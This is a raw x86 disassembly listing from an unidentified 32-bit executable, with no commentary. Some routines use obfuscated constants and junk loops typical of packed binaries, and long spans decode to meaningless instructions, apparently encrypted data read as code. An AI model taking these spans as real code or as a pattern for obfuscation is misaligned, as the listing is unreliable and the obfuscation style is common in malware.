  410249:	sbb    edx,esi
  41024b:	pop    ecx
  41024c:	jno    0x4102ca
  41024e:	dec    edi
  41024f:	dec    DWORD PTR ss:[ecx]
  410252:	mov    al,ds:0x59f4de7
  410257:	test   eax,0x56bfd408
  41025c:	out    dx,al
  41025d:	cmp    ebp,ebp
  41025f:	cmp    DWORD PTR [ecx-0x2a],edi
  410262:	aas    
  410263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410264:	into   
  410265:	adc    eax,DWORD PTR [ebp+0x4b]
  410268:	stos   BYTE PTR es:[edi],al
  410269:	dec    ebp
  41026a:	aad    0x69
  41026c:	xchg   esi,eax
  41026d:	dec    edx
  41026e:	dec    ecx
  41026f:	add    BYTE PTR [edi],dl
  410271:	dec    esi
  410272:	xor    BYTE PTR [ecx],dh
  410274:	mov    dl,0x92
  410276:	arpl   WORD PTR [edx+0x7dd85f66],dx
  41027c:	sub    BYTE PTR [eax-0x4def029e],bl
  410282:	jno    0x410211
  410284:	inc    ebx
  410285:	sub    al,0x61
  410287:	rcl    BYTE PTR [ebx+0x13e06fe2],cl
  41028d:	xchg   ebx,eax
  41028e:	cmc    
  41028f:	xchg   BYTE PTR [ebp+0x63921846],cl
  410295:	mov    esi,DWORD PTR [ebp-0x8]
  410298:	mov    DWORD PTR ds:0x4337eb,0x5b5
  4102a2:	xor    eax,edx
  4102a4:	xor    esi,edx
  4102a6:	add    eax,ecx
  4102a8:	sub    DWORD PTR ds:0x43370f,0x433803
  4102b2:	add    esi,ecx
  4102b4:	imul   eax,esi
  4102b7:	jmp    0x41034e
  4102bc:	mov    DWORD PTR ds:0x433713,0x12
  4102c6:	cmp    DWORD PTR ds:0x433713,0x0
  4102cd:	je     0x410313
  4102d3:	cmp    DWORD PTR ds:0x433713,0x7
  4102da:	jne    0x4102eb
  4102e0:	push   0x1099
  4102e5:	call   DWORD PTR ds:0x412038
  4102eb:	cmp    DWORD PTR ds:0x433713,0x8
  4102f2:	jne    0x410303
  4102f8:	mov    eax,ds:0x433713
  4102fd:	dec    eax
  4102fe:	mov    ds:0x433713,eax
  410303:	mov    eax,ds:0x433713
  410308:	dec    eax
  410309:	mov    ds:0x433713,eax
  41030e:	jmp    0x4102c6
  410313:	mov    eax,DWORD PTR [ebp+0xc]
  410316:	mov    eax,DWORD PTR [eax+0x78]
  410319:	mov    DWORD PTR [ebp+0xc],eax
  41031c:	mov    eax,DWORD PTR [ebp-0x4]
  41031f:	mov    esi,DWORD PTR [ebp-0x8]
  410322:	xor    eax,edx
  410324:	xor    esi,edx
  410326:	add    eax,ecx
  410328:	add    esi,ecx
  41032a:	imul   eax,esi
  41032d:	mov    esi,DWORD PTR [ebp+0xc]
  410330:	cmp    esi,eax
  410332:	mov    eax,DWORD PTR [ebp-0x4]
  410335:	je     0x40ffbc
  41033b:	xor    eax,edx
  41033d:	add    eax,ecx
  41033f:	mov    ecx,DWORD PTR [ebp+0xc]
  410342:	imul   eax,ecx
  410345:	add    eax,DWORD PTR [ebp+0x8]
  410348:	mov    DWORD PTR [ebp+0xc],eax
  41034b:	mov    eax,DWORD PTR [ebp+0xc]
  41034e:	pop    esi
  41034f:	leave  
  410350:	ret    0x8
  410353:	push   ebp
  410354:	mov    ebp,esp
  410356:	push   ecx
  410357:	and    DWORD PTR ds:0x43370f,0x0
  410361:	jmp    0x410371
  410366:	mov    eax,ds:0x43370f
  41036b:	inc    eax
  41036c:	mov    ds:0x43370f,eax
  410371:	cmp    DWORD PTR ds:0x43370f,0x11
  410378:	jae    0x4103b4
  41037e:	cmp    DWORD PTR ds:0x43370f,0x9
  410385:	jne    0x410391
  41038b:	call   DWORD PTR ds:0x41203c
  410391:	cmp    DWORD PTR ds:0x43370f,0x8
  410398:	jne    0x4103a9
  41039e:	mov    eax,ds:0x43370f
  4103a3:	inc    eax
  4103a4:	mov    ds:0x43370f,eax
  4103a9:	jmp    0x410366
  4103ae:	xor    DWORD PTR ds:0x43371f,edi
  4103b4:	push   ecx
  4103b5:	add    DWORD PTR ds:0x43377f,0x4337bf
  4103bf:	mov    eax,0xf89c8531
  4103c4:	or     edx,DWORD PTR ds:0x433767
  4103ca:	mov    DWORD PTR [ebp-0x8],eax
  4103cd:	jmp    0x41065e
  4103d2:	jne    0x4103d9
  4103d4:	dec    eax
  4103d5:	cs push 0xee457173
  4103db:	xchg   edx,eax
  4103dc:	or     DWORD PTR [ebp+0x33ef40a4],esp
  4103e2:	and    eax,0xea7e7ebd
  4103e7:	jl     0x410467
  4103e9:	jle    0x410433
  4103eb:	lods   al,BYTE PTR ds:[esi]
  4103ec:	aad    0xda
  4103ee:	call   0x15bdc53f
  4103f3:	pop    ss
  4103f4:	cwde   
  4103f5:	adc    esp,eax
  4103f7:	jge    0x41045a
  4103f9:	xchg   edx,eax
  4103fa:	scas   al,BYTE PTR es:[edi]
  4103fb:	ins    BYTE PTR es:[edi],dx
  4103fc:	loop   0x4103a1
  4103fe:	pop    esp
  4103ff:	add    DWORD PTR [edx+eax*1],0x2603cc28
  410406:	mov    fs,esi
  410408:	sbb    BYTE PTR [edx-0x5bfa1338],bl
  41040e:	outs   dx,DWORD PTR ds:[esi]
  41040f:	mov    esp,0xdfc2c964
  410414:	test   eax,0xd9e83fb2
  410419:	cmp    bh,bh
  41041b:	push   esp
  41041c:	rol    BYTE PTR [ebp+esi*2+0x7715fe9f],1
  410423:	xor    BYTE PTR [edi+0x74],0xfe
  410427:	ret    0x9ea9
  41042a:	push   ecx
  41042b:	not    al
  41042d:	pop    ecx
  41042e:	mov    edx,0xc665ac67
  410433:	jbe    0x4103b6
  410435:	cmp    edi,DWORD PTR [ecx-0x4]
  410438:	xor    dh,BYTE PTR [edi+0x212b5838]
  41043e:	xchg   ebx,eax
  41043f:	adc    BYTE PTR [edx+edx*8-0x738c96e5],dh
  410446:	xchg   esi,eax
  410447:	mov    DWORD PTR [esi+0x3],ebp
  41044a:	sub    edx,ebp
  41044c:	jmp    0x8f4bbb01
  410451:	clc    
  410452:	imul   ecx,DWORD PTR [eax-0x24],0xdd33e96f
  410459:	mov    WORD PTR [esp+ebp*1],ss
  41045c:	rcr    BYTE PTR [edx+0x61ececa3],cl
  410462:	or     ebp,DWORD PTR [edx-0x1fbac6a3]
  410468:	add    al,0xaa
  41046a:	iret   
  41046b:	or     BYTE PTR [ecx-0x64],ch
  41046e:	adc    edi,ecx
  410470:	xor    dh,BYTE PTR [eax]
  410472:	jnp    0x4103fd
  410474:	jle    0x410490
  410476:	fnsave [ebx+0x321f49ab]
  41047c:	mov    edi,0x7de67463
  410481:	sbb    al,dl
  410483:	data16 and al,0x7a
  410486:	cdq    
  410487:	mov    ds:0xb267449e,al
  41048c:	ins    BYTE PTR es:[edi],dx
  41048d:	gs pop esp
  41048f:	jge    0x410454
  410491:	cmp    ecx,DWORD PTR ds:0x8507e96c
  410497:	into   
  410498:	lods   al,BYTE PTR ds:[esi]
  410499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41049a:	cli    
  41049b:	sbb    ebp,ebp
  41049d:	scas   eax,DWORD PTR es:[edi]
  41049e:	stc    
  41049f:	imul   eax,DWORD PTR ds:0x482c58a,0x874a05eb
  4104a9:	popa   
  4104aa:	mov    bl,0xe2
  4104ac:	cmc    
  4104ad:	lds    esp,FWORD PTR [edi+ebx*1]
  4104b0:	push   cs
  4104b1:	pop    ss
  4104b2:	aad    0x15
  4104b4:	jbe    0x41052f
  4104b6:	bound  edx,QWORD PTR [ebx+0x50]
  4104b9:	sub    eax,0x32ccf8c8
  4104be:	cvtps2pi mm2,QWORD PTR [eax-0x17]
  4104c2:	sub    dh,BYTE PTR [ebx]
  4104c4:	sbb    edx,DWORD PTR [ebx+0x7]
  4104c7:	nop
  4104c8:	repz (bad) 
  4104ca:	push   DWORD PTR [edx-0x3]
  4104cd:	clc    
  4104ce:	add    edi,edx
  4104d0:	fcom   QWORD PTR [edi]
  4104d2:	jo     0x41046a
  4104d4:	cmp    BYTE PTR [ebp+0x47],dl
  4104d7:	aam    0x86
  4104d9:	leave  
  4104da:	mov    ecx,0xe50cd932
  4104df:	loop   0x4104bd
  4104e1:	dec    edi
  4104e2:	in     al,dx
  4104e3:	mov    ebx,0xf2a8c6e6
  4104e8:	mov    ch,0xa0
  4104ea:	mov    esp,0x9a54f3b
  4104ef:	xchg   ebx,eax
  4104f0:	pop    ecx
  4104f1:	out    0xe6,eax
  4104f3:	mov    eax,0x68fa9539
  4104f8:	cwde   
  4104f9:	add    DWORD PTR [eax],0xfffffffa
  4104fc:	sub    BYTE PTR [ebp-0x59],ch
  4104ff:	into   
  410500:	push   0xffffffe6
  410502:	cmp    BYTE PTR [edi+0x3b],dh
  410505:	out    dx,eax
  410506:	or     esi,DWORD PTR [esp+ebx*4]
  410509:	call   0xc8504702
  41050e:	xchg   esi,eax
  41050f:	je     0x4104f2
  410511:	jno    0x4104d7
  410513:	cwde   
  410514:	leave  
  410515:	xchg   edi,eax
  410516:	data16 (bad) 
  410518:	sbb    eax,0xb16a43a1
  41051d:	pop    edx
  41051e:	mov    bl,0x9
  410520:	ja     0x41051d
  410522:	xchg   edx,eax
  410523:	sub    eax,0x4f12e106
  410528:	inc    esi
  410529:	ss shr esp,cl
  41052c:	jno    0x4104b8
  41052e:	imul   DWORD PTR [edx]
  410530:	fstp   TBYTE PTR [esi-0x6d]
  410533:	xor    DWORD PTR [esi+0x40bc82f9],0x1b05d401
  41053d:	shl    DWORD PTR [edx],0x62
  410540:	mov    DWORD PTR [eax+0x731f9e14],ebx
  410546:	in     eax,dx
  410547:	pop    esp
  410548:	lahf   
  410549:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41054a:	clc    
  41054b:	das    
  41054c:	mov    ecx,esp
  41054e:	mov    al,0xdf
  410550:	add    al,0xde
  410552:	lods   al,BYTE PTR ds:[esi]
  410553:	das    
  410554:	pop    ss
  410555:	jmp    0x41058f
  410557:	jp     0x41056d
  410559:	pop    ebx
  41055a:	bound  esi,QWORD PTR ds:0x67e5739f
  410560:	(bad)  
  410561:	sbb    al,0x4a
  410563:	mov    bh,dl
  410565:	enter  0x5c3,0xa
  410569:	xor    DWORD PTR [ecx],0x3669f774
  41056f:	dec    esp
  410570:	idiv   DWORD PTR [ebx]
  410572:	push   ebx
  410573:	pop    es
  410574:	xchg   ebx,eax
  410575:	jg     0x41054c
  410577:	out    dx,eax
  410578:	adc    BYTE PTR [edx-0x2bffe469],bl
  41057e:	out    dx,eax
  41057f:	fs pop ds
  410581:	push   ss
  410582:	or     BYTE PTR [edi-0x3c],ah
  410585:	cdq    
  410586:	and    edi,edx
  410588:	(bad)  
  410589:	mov    DWORD PTR [edx+edx*4+0x59],edx
  41058d:	mov    dh,BYTE PTR [edx]
  41058f:	jmp    0x4823:0x150e0ad2
  410596:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410597:	dec    esp
  410598:	mov    cl,0xeb
  41059a:	pusha  
  41059b:	test   eax,0x1d14982e
  4105a0:	inc    eax
  4105a1:	sti    
  4105a2:	popf   
  4105a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105a4:	xchg   edx,eax
  4105a5:	xchg   edi,eax
  4105a6:	jno    0x4105b4
  4105a8:	push   0xe3c0e157
  4105ad:	add    BYTE PTR [ebp+0x7e],bh
  4105b0:	xor    edi,edx
  4105b2:	aam    0x59
  4105b4:	call   0x265a:0x762b68ac
  4105bb:	dec    ebx
  4105bc:	dec    esi
  4105bd:	push   edi
  4105be:	ret    0x8d85
  4105c1:	push   esi
  4105c2:	clc    
  4105c3:	jnp    0x4105b4
  4105c5:	std    
  4105c6:	adc    eax,0xfd5b789
  4105cb:	and    al,0x94
  4105cd:	scas   eax,DWORD PTR es:[edi]
  4105ce:	ror    DWORD PTR [ebx+0xa],0x94
  4105d2:	outs   dx,BYTE PTR ds:[esi]
  4105d3:	les    ebx,FWORD PTR [edi-0x2321a2a9]
  4105d9:	xchg   edi,eax
  4105da:	sub    ebx,DWORD PTR [ebp+edx*2+0x54]
  4105de:	mov    WORD PTR gs:[edi-0x44],ds
  4105e2:	sub    DWORD PTR [ebp-0x2b4c4b34],edx
  4105e8:	lods   eax,DWORD PTR ds:[esi]
  4105e9:	jmp    0x45e6dfba
  4105ee:	xchg   edi,eax
  4105ef:	xchg   ebp,eax
  4105f0:	stc    
  4105f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105f2:	call   0x166d:0x44527e30
  4105f9:	add    BYTE PTR [ebp-0x20e99970],ch
  4105ff:	ror    BYTE PTR [ebp+0x94d40c9],cl
  410605:	(bad)  
  410606:	jmp    0x4105e4
  410608:	sbb    bh,BYTE PTR [ebp+0x48ea6d3e]
  41060e:	push   ebx
  41060f:	xor    eax,0x7d752412
  410614:	repz push esi
  410616:	mov    edi,0x7061d3cc
  41061b:	and    al,0x0
  41061d:	jl     0x410676
  41061f:	in     al,dx
  410620:	mov    dl,0x21
  410622:	cwde   
  410623:	call   0x7fc5c552
  410628:	xchg   edi,eax
  410629:	out    dx,eax
  41062a:	adc    DWORD PTR [eax-0x44],0xcfced4c7
  410631:	out    dx,al
  410632:	(bad)  
  410633:	push   edx
  410634:	test   DWORD PTR [ebx],ebx
  410636:	daa    
  410637:	mov    dh,0x9b
  410639:	mov    dh,ch
  41063b:	sbb    BYTE PTR [eax],0x14
  41063e:	loope  0x4106ae
  410640:	out    dx,al
  410641:	xchg   edx,eax
  410642:	cmp    eax,0x97b60c67
  410647:	mov    cl,0xa3
  410649:	inc    esp
  41064a:	stos   DWORD PTR es:[edi],eax
  41064b:	adc    BYTE PTR [esi],0x4
  41064e:	nop
  41064f:	pop    ds
  410650:	xchg   esi,eax
  410651:	cmp    ecx,DWORD PTR [ecx+0x24d76212]
  410657:	ret    0xfd0e
  41065a:	cli    
  41065b:	mov    dh,0xf3
  41065d:	fadd   st(7),st
  41065f:	inc    ebp
  410660:	cld    
  410661:	xor    al,BYTE PTR [ebp+0x2581f89c]
  410667:	adc    esi,DWORD PTR [edi]
  410669:	inc    ebx
  41066a:	add    BYTE PTR [eax],al
  41066c:	add    BYTE PTR [eax],al
  41066e:	add    BYTE PTR [ebx+0x43371315],cl
  410674:	add    BYTE PTR [edx-0x77],al
  410677:	adc    eax,0x433713
  41067c:	cmp    DWORD PTR ds:0x433713,0x22
  410683:	jne    0x410692
  410689:	push   DWORD PTR [ebp-0x20]
  41068c:	call   DWORD PTR ds:0x412040
  410692:	cmp    DWORD PTR ds:0x433713,0x12
  410699:	jb     0x41066f
  41069f:	xor    edx,edx
  4106a1:	or     edx,DWORD PTR ds:0x4337ef
  4106a7:	sbb    edx,DWORD PTR ds:0x43371b
  4106ad:	mov    DWORD PTR ds:0x4337ef,edx
  4106b3:	mov    edx,DWORD PTR [ebp-0x8]
  4106b6:	mov    DWORD PTR ds:0x433733,0x17
  4106c0:	cmp    DWORD PTR ds:0x433733,0x0
  4106c7:	je     0x410724
  4106cd:	cmp    DWORD PTR ds:0x433733,0xc
  4106d4:	jne    0x4106ee
  4106da:	push   0x4338fc
  4106df:	push   DWORD PTR [ebp-0x1c]
  4106e2:	push   DWORD PTR [ebp-0x18]
  4106e5:	push   DWORD PTR [ebp-0x1c]
  4106e8:	call   DWORD PTR ds:0x4121e8
  4106ee:	cmp    DWORD PTR ds:0x433733,0xd
  4106f5:	jne    0x410708
  4106fb:	mov    ecx,DWORD PTR ds:0x433733
  410701:	dec    ecx
  410702:	mov    DWORD PTR ds:0x433733,ecx
  410708:	mov    ecx,DWORD PTR ds:0x433733
  41070e:	dec    ecx
  41070f:	mov    DWORD PTR ds:0x433733,ecx
  410715:	jmp    0x4106c0
  41071a:	mov    DWORD PTR ds:0x4337f3,0x1fcc
  410724:	push   esi
  410725:	xor    DWORD PTR ds:0x4337b7,ebx
  41072b:	mov    ecx,0x7510854
  410730:	sbb    DWORD PTR ds:0x433717,ecx
  410736:	xor    edx,ecx
  410738:	mov    esi,0x32729b
  41073d:	adc    DWORD PTR ds:0x433727,0x4337ab
  410747:	push   edi
  410748:	mov    edi,DWORD PTR [ebp+0x10]
  41074b:	add    edx,esi
  41074d:	cmp    edi,edx
  41074f:	je     0x410a59
  410755:	mov    edx,DWORD PTR [ebp-0x8]
  410758:	mov    eax,DWORD PTR [ebp-0x4]
  41075b:	xor    eax,ecx
  41075d:	mov    edi,0xffcd8d65
  410762:	sub    edi,eax
  410764:	add    edi,DWORD PTR [ebp+0x10]
  410767:	xor    edx,ecx
  410769:	add    edx,esi
  41076b:	cmp    edx,edi
  41076d:	ja     0x410a54
  410773:	push   ebx
  410774:	jmp    0x41077e
  410779:	mov    esi,0x32729b
  41077e:	mov    eax,DWORD PTR [ebp-0x8]
  410781:	mov    edi,DWORD PTR [ebp-0x4]
  410784:	xor    edi,ecx
  410786:	add    edi,esi
  410788:	mov    esi,DWORD PTR [ebp+0x8]
  41078b:	imul   edi,edx
  41078e:	mov    ebx,DWORD PTR [ebp+0xc]
  410791:	xor    eax,ecx
  410793:	add    eax,edx
  410795:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  41079c:	mov    BYTE PTR [edi+esi*1],al
  41079f:	mov    eax,DWORD PTR [ebp-0x4]
  4107a2:	xor    eax,ecx
  4107a4:	lea    edx,[edx+eax*1+0x32729b]
  4107ab:	mov    eax,DWORD PTR [ebp-0x4]
  4107ae:	xor    eax,ecx
  4107b0:	mov    esi,0xffcd8d65
  4107b5:	sub    esi,eax
  4107b7:	add    esi,DWORD PTR [ebp+0x10]
  4107ba:	cmp    edx,esi
  4107bc:	jbe    0x410779
  4107c2:	pop    ebx
  4107c3:	jmp    0x410a54
  4107c8:	out    dx,eax
  4107c9:	adc    al,0x6b
  4107cb:	adc    esi,DWORD PTR [ecx+0x71]
  4107ce:	ja     0x4107c0
  4107d0:	or     DWORD PTR [eax],0x28
  4107d3:	icebp  
  4107d4:	adc    BYTE PTR [ebp+esi*2-0x7c],bl
  4107d8:	xchg   ecx,eax
  4107d9:	mov    ebx,0x7cea7e7e
  4107de:	jle    0x41085e
  4107e0:	out    dx,al
  4107e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107e2:	out    dx,al
  4107e3:	adc    BYTE PTR [ecx-0x33],dh
  4107e6:	jmp    0x43e9f6f7
  4107eb:	imul   ebp,DWORD PTR [ecx-0x2c3ce0fe],0xcdee8ce2
  4107f5:	mov    bl,0xfc
  4107f7:	clc    
  4107f8:	sbb    edx,ebx
  4107fa:	jle    0x410853
  4107fc:	iret   
  4107fd:	dec    ebx
  4107fe:	dec    ebx
  4107ff:	mov    ebp,DWORD PTR ds:0x29417071
  410805:	add    eax,0x46afa353
  41080a:	pop    ds
  41080b:	cs cwde 
  41080d:	push   ecx
  41080e:	inc    ebx
  41080f:	mov    es,WORD PTR [ebp-0x46]
  410812:	scas   eax,DWORD PTR es:[edi]
  410813:	sub    al,0xed
  410815:	mov    ecx,0x2b006fd
  41081a:	xchg   DWORD PTR [ebp+0x62],ebp
  41081d:	fdiv   QWORD PTR [edi+eiz*2+0x678ad32e]
  410824:	push   esp
  410825:	inc    ecx
  410826:	and    ebp,edx
  410828:	sub    eax,0x4c8eff7
  41082d:	and    bl,dh
  41082f:	xor    esi,DWORD PTR [edx-0x3284a2a9]
  410835:	jns    0x4108b2
  410837:	push   esp
  410838:	dec    ecx
  410839:	rol    bh,0xbe
  41083c:	inc    edx
  41083d:	push   ebp
  41083e:	retf   0xac3d
  410841:	inc    esp
  410842:	inc    ecx
  410843:	rcr    DWORD PTR [edi-0x13],1
  410846:	jae    0x41082a
  410848:	cmovo  edi,ebp
  41084b:	outs   dx,BYTE PTR ds:[esi]
  41084c:	les    esp,FWORD PTR [edi-0x15]
  41084f:	pop    esp
  410850:	sahf   
  410851:	xchg   ebx,eax
  410852:	ja     0x41086b
  410854:	lds    ecx,FWORD PTR [eax-0x10]
  410857:	dec    esi
  410858:	sbb    DWORD PTR [ebx-0x5a2fe57],esp
  41085e:	or     ebp,DWORD PTR fs:[esi+0x72c8d426]
  410865:	in     eax,dx
  410866:	mov    dl,0xd
  410868:	sar    BYTE PTR ds:0x23d347c8,cl
  41086e:	adc    ebp,ecx
  410870:	dec    esi
  410871:	std    
  410872:	cmp    ch,bh
  410874:	pop    esi
  410875:	ins    BYTE PTR es:[edi],dx
  410876:	aam    0x74
  410878:	pop    ecx
  410879:	mov    esp,DWORD PTR [ebp-0x48adc969]
  41087f:	pop    bx
  410881:	sbb    BYTE PTR [edx-0x6a],bl
  410884:	iret   
  410885:	or     DWORD PTR [ecx+ebp*4],edi
  410888:	push   ds
  410889:	xor    BYTE PTR [edx],ch
  41088b:	sbb    dl,ch
  41088d:	mov    al,BYTE PTR [edi]
  41088f:	cmp    BYTE PTR [ebx-0x4],al
  410892:	test   al,0x8b
  410894:	push   edx
  410895:	jg     0x4108d2
  410897:	mov    DWORD PTR [ebx],esp
  410899:	popf   
  41089a:	fsubr  QWORD PTR [edx+0x6d213f00]
  4108a0:	in     eax,dx
  4108a1:	sar    DWORD PTR [ecx-0x65854fe8],0x9c
  4108a8:	cmp    cl,BYTE PTR [esi+edi*2]
  4108ab:	call   0xb5758eff
  4108b0:	in     eax,0x4c
  4108b2:	call   0x1020f5d
  4108b7:	xchg   ebp,eax
  4108b8:	pop    ecx
  4108b9:	jbe    0x41083e
  4108bb:	scas   al,BYTE PTR es:[edi]
  4108bc:	dec    edx
  4108bd:	xor    eax,0x9d8cf788
  4108c2:	ins    DWORD PTR es:[edi],dx
  4108c3:	inc    eax
  4108c4:	adc    eax,0x9ea47ad1
  4108c9:	pop    esi
  4108ca:	or     ecx,eax
  4108cc:	sub    al,0x8f
  4108ce:	jns    0x4108d4
  4108d0:	fsub   QWORD PTR fs:[esi]
  4108d3:	ficom  WORD PTR ds:0xd559710f
  4108d9:	mov    bl,0xd3
  4108db:	test   eax,0xcc72058d
  4108e0:	hlt    
  4108e1:	pop    eax
  4108e2:	in     al,0x9c
  4108e4:	pop    ebx
  4108e5:	dec    eax
  4108e6:	(bad)  
  4108e7:	mov    al,ds:0x84982a48
  4108ec:	inc    ebx
  4108ed:	mov    bh,0xaf
  4108ef:	cwde   
  4108f0:	dec    esi
  4108f1:	rol    BYTE PTR [esi],1
  4108f3:	popf   
  4108f4:	and    al,bh
  4108f6:	int3   
  4108f7:	and    ch,ch
  4108f9:	mov    bh,0xa8
  4108fb:	es call 0x34d9:0x11e7ec51
  410903:	(bad)  
  410905:	sub    edx,0x26
  410908:	seta   cl
  41090b:	je     0x410978
  41090d:	push   ds
  41090e:	sbb    eax,0x7159d12a
  410913:	pushf  
  410914:	stc    
  410915:	out    dx,al
  410916:	jne    0x4108f5
  410918:	sub    edx,ecx
  41091a:	nop    DWORD PTR [ecx+edx*2+0x30b85bb5]
  410922:	loop   0x410958
  410924:	cmp    eax,0x67489b25
  410929:	mov    al,ds:0xd280773c
  41092e:	jae    0x410981
  410930:	iret   
  410931:	gs addr16 jo 0x41096d
  410935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410936:	adc    al,0x94
  410938:	std    
  410939:	sub    ebp,DWORD PTR [edi+ebp*8-0x44]
  41093d:	retf   0xeeb1
  410940:	(bad)  
  410942:	out    0x52,al
  410944:	jb     0x41097c
  410946:	and    BYTE PTR [ebx+0x7a],0xb1
  41094a:	mov    dl,0x83
  41094c:	ins    BYTE PTR es:[edi],dx
  41094d:	es sbb ax,0x53ec
  410952:	or     al,0x17
  410954:	fild   WORD PTR [edi]
  410956:	adc    BYTE PTR [esi+0x3a7f4569],0xf5
  41095d:	out    0x21,eax
  41095f:	push   ss
  410960:	mov    esp,0x3914c19d
  410966:	sbb    eax,0x8fd8ca2e
  41096b:	mov    esp,0x99082a49
  410970:	push   ss
  410971:	popf   
  410972:	sbb    BYTE PTR [edi-0x6826b46c],dl
  410978:	sub    WORD PTR [eax],si
  41097b:	dec    esi
  41097c:	sbb    eax,0x9aa70f58
  410981:	inc    edx
  410982:	aaa    
  410983:	adc    ch,BYTE PTR [edi]
  410985:	mov    dl,0xd4
  410987:	test   BYTE PTR [edx-0xc],0x1e
  41098b:	cli    
  41098c:	ret    
  41098d:	arpl   WORD PTR [ebp-0xe],di
  410990:	std    
  410991:	sub    eax,DWORD PTR [eax]
  410993:	jg     0x41091e
  410995:	xchg   ebx,eax
  410996:	push   esp
  410997:	out    dx,eax
  410998:	lahf   
  410999:	loope  0x410992
  41099b:	push   ebx
  41099c:	adc    esi,0x93dad36c
  4109a2:	in     al,dx
  4109a3:	retf   0x8327
  4109a6:	mov    ebx,0x998af5c0
  4109ab:	popf   
  4109ac:	call   0x325a3a04
  4109b1:	and    eax,0xd4ee4cb8
  4109b6:	sbb    BYTE PTR [edi-0x61],cl
  4109b9:	fiadd  DWORD PTR [esi-0x45]
  4109bc:	adc    eax,DWORD PTR [ecx]
  4109be:	mov    eax,0x1d9cb706
  4109c3:	mov    ebp,DWORD PTR [edi-0x4f]
  4109c6:	scas   eax,DWORD PTR es:[edi]
  4109c7:	sub    al,0xc9
  4109c9:	xchg   edi,eax
  4109ca:	pushf  
  4109cb:	sub    ch,BYTE PTR [ecx+0x5b1b3868]
  4109d1:	pop    edx
  4109d2:	(bad)  
  4109d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109d4:	jp     0x4109c9
  4109d6:	xchg   ecx,eax
  4109d7:	push   edi
  4109d8:	pop    esi
  4109d9:	push   ebx
  4109da:	adc    al,0x8d
  4109dc:	pop    esp
  4109dd:	(bad)  
  4109de:	or     dh,bl
  4109e0:	mov    ds:0x6440bf2,al
  4109e5:	mov    BYTE PTR [ebx+0x60],ch
  4109e8:	retf   
  4109e9:	sbb    DWORD PTR [ebx],ecx
  4109eb:	push   0x6d776850
  4109f0:	mov    dl,0xdb
  4109f2:	mov    ch,0xc5
  4109f4:	nop
  4109f5:	xor    ah,bh
  4109f7:	push   0xff1cd113
  4109fc:	out    dx,eax
  4109fd:	add    ah,dh
  4109ff:	lock call 0x1ef2:0xfaa4c76e
  410a07:	mov    dl,0xf2
  410a09:	mov    cl,0xde
  410a0b:	dec    edx
  410a0c:	mov    ds:0x6cf4a6d3,al
  410a11:	sti    
  410a12:	in     al,dx
  410a13:	fwait
  410a14:	popf   
  410a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a16:	or     edi,DWORD PTR [esp+edi*4-0x5a]
  410a1a:	push   esi
  410a1b:	xchg   edi,eax
  410a1c:	popf   
  410a1d:	sub    DWORD PTR [ecx],esi
  410a1f:	mov    ebx,0x7c701ecd
  410a24:	jne    0x4109b9
  410a26:	lea    ebx,[edx]
  410a28:	cmp    ebp,edi
  410a2a:	adc    BYTE PTR [ecx+0x660b27fb],0xe9
  410a31:	dec    eax
  410a32:	ds int3 
  410a34:	sub    al,0x86
  410a36:	mov    dl,BYTE PTR [ebx+0x3a]
  410a39:	adc    eax,0x1ee08e57
  410a3e:	push   ecx
  410a3f:	adc    eax,0xbbeb2256
  410a44:	fimul  DWORD PTR [edx+eiz*8+0x77]
  410a48:	mov    al,0x72
  410a4a:	pusha  
  410a4b:	fidivr DWORD PTR [ecx+0x62]
  410a4e:	stos   DWORD PTR es:[edi],eax
  410a4f:	shr    DWORD PTR [ebx+0x36],cl
  410a52:	les    ecx,FWORD PTR [edi-0x48]
  410a55:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  410a5b:	leave  
  410a5c:	ret    0xc
  410a5f:	push   ebp
  410a60:	mov    ebp,esp
  410a62:	mov    eax,DWORD PTR [ebp+0xc]
  410a65:	xor    edx,edx
  410a67:	mov    ecx,0x7264fca9
  410a6c:	div    ecx
  410a6e:	mov    ecx,DWORD PTR [ebp+0x10]
  410a71:	and    ecx,eax
  410a73:	or     ecx,0x81161d8f
  410a79:	mov    eax,ecx
  410a7b:	pop    ebp
  410a7c:	ret    0x18
  410a7f:	push   ebp
  410a80:	mov    ebp,esp
  410a82:	sub    esp,0x58
  410a85:	xor    DWORD PTR ds:0x4337e7,ecx
  410a8b:	mov    ecx,DWORD PTR [ebp+0x8]
  410a8e:	movzx  eax,WORD PTR ds:0x4337bf
  410a95:	sbb    eax,DWORD PTR ds:0x433843
  410a9b:	mov    ds:0x4337bf,eax
  410aa0:	mov    eax,0x8a3c
  410aa5:	xor    ax,WORD PTR [ecx+0x20]
  410aa9:	and    DWORD PTR ds:0x4337b7,0x4337ff
  410ab3:	mov    ecx,0x3b02
  410ab8:	add    ax,cx
  410abb:	and    DWORD PTR ds:0x4337af,0x7f6b
  410ac5:	movzx  eax,ax
  410ac8:	xor    DWORD PTR ds:0x433767,0x6006
  410ad2:	mov    DWORD PTR [ebp-0xc],eax
  410ad5:	mov    BYTE PTR [ebp-0x1],0x7f
  410ad9:	adc    ecx,0x1b78
  410adf:	lea    eax,[ebp-0x1]
  410ae2:	mov    DWORD PTR [ebp-0x10],eax
  410ae5:	adc    ecx,DWORD PTR ds:0x4337f7
  410aeb:	mov    al,BYTE PTR [ebp-0x1]
  410aee:	mov    ecx,DWORD PTR [ebp-0x10]
  410af1:	xor    al,0x46
  410af3:	sub    al,0x38
  410af5:	adc    DWORD PTR ds:0x43372b,0x433737
  410aff:	mov    BYTE PTR [ecx],al
  410b01:	xor    eax,eax
  410b03:	xor    eax,DWORD PTR ds:0x43372b
  410b09:	sbb    DWORD PTR ds:0x433773,eax
  410b0f:	jmp    0x410cab
  410b14:	add    DWORD PTR [ecx-0x1ca338a4],eax
  410b1a:	mov    eax,ds:0xb67bce41
  410b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b20:	or     edx,esi
  410b22:	sbb    ecx,eax
